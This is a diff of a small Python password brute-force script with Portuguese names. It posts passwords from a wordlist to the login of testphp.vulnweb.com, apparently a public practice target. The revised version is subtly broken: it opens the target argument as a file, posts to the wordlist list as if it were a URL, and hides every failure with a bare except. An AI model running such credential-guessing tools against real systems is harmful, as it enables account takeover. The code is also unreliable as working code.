@@ -1,16 +1,28 @@
 import requests
+import sys
 
-with open ("caminho_wordlist.txt", "r") as file:
-    wordlist = file.read().splitlines()
+def brute_force_senha(alvo, wordlist):
+    if len(sys.argv) == 3:
+        try:
+            with open (alvo, "r") as file:
+                wordlist = file.read().splitlines()
 
-    for senha in wordlist:
-        data = {
-            "user": "test",
-            "password": senha
-        }
-        response = requests.post("http://testphp.vulnweb.com/userinfo.php", data=data)
-        if "logout" in response.text:
-            print(f"senha correta {senha}")
+                for senha in wordlist:
+                    data = {
+                        "user": "test",
+                        "password": senha
+                    }
+                    response = requests.post(wordlist, data=data)
+                    if "logout" in response.text:
+                        senha_correta = senha
+                        print(f"senha encontrada {senha_correta}")
 
-        else:
-            print(f"senha incorreta {senha}")
+                    else:
+                        pass
+        except:
+            pass
+
+if __name__ == "__main__":
+    alvo = sys.argv[1]
+    wordlist = sys.argv[2]
+    brute_force_senha(alvo, wordlist)
